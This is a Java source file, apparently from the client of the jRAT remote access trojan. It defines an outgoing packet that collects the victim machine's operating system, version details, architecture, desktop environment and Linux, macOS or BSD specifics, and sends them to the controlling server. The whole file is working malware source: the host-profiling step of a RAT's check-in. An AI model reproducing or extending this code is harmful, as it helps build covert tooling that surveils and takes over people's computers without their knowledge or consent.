package jrat.client.packets.outgoing;

import jrat.client.Connection;
import oslib.AbstractOperatingSystem;
import oslib.Arch;
import oslib.DesktopEnvironment;
import oslib.OperatingSystem;
import oslib.bsd.BSDOperatingSystem;
import oslib.linux.LinuxOperatingSystem;
import oslib.macos.MacOSOperatingSystem;

public class Packet4InitOperatingSystem extends AbstractOutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
		
		con.writeLine(os.getType().getName());
		con.writeLine(os.getDetailedString());
		con.writeLine(Arch.getArch().getName());
		
		DesktopEnvironment de = os.getDesktopEnvironment();
		con.writeLine(de.getSearch());	
		con.writeBoolean(de.getVersion() != null);
		if (de.getVersion() != null) {
			con.writeLine(de.getVersion());
		}
		
		if (os.getType() == OperatingSystem.LINUX) {
			LinuxOperatingSystem los = (LinuxOperatingSystem) os;
			con.writeLine(los.getDistroSpec().getDistro().getName());
			
			String codename = los.getDistroSpec().getCodename();
			
			con.writeBoolean(codename != null);
			if (codename != null) {
				con.writeLine(codename);
			}
			
			String release = los.getDistroSpec().getRelease();
			
			con.writeBoolean(release != null);
			if (release != null) {
				con.writeLine(release);
			}
		} else if (os.getType() == OperatingSystem.MACOS) {
			MacOSOperatingSystem oos = (MacOSOperatingSystem) os;
			
			con.writeBoolean(oos.getVersion() != null);
			
			if (oos.getVersion() != null) {
				con.writeLine(oos.getVersion().getDisplay());
				con.writeLine(oos.getVersion().getVersion());
			}
		} else if (os.getType() == OperatingSystem.BSD) {
			BSDOperatingSystem bos = (BSDOperatingSystem) os;
			con.writeLine(bos.getFlavor().getName());
		}
	}

	@Override
	public short getPacketId() {
		return (byte) 4;
	}
}
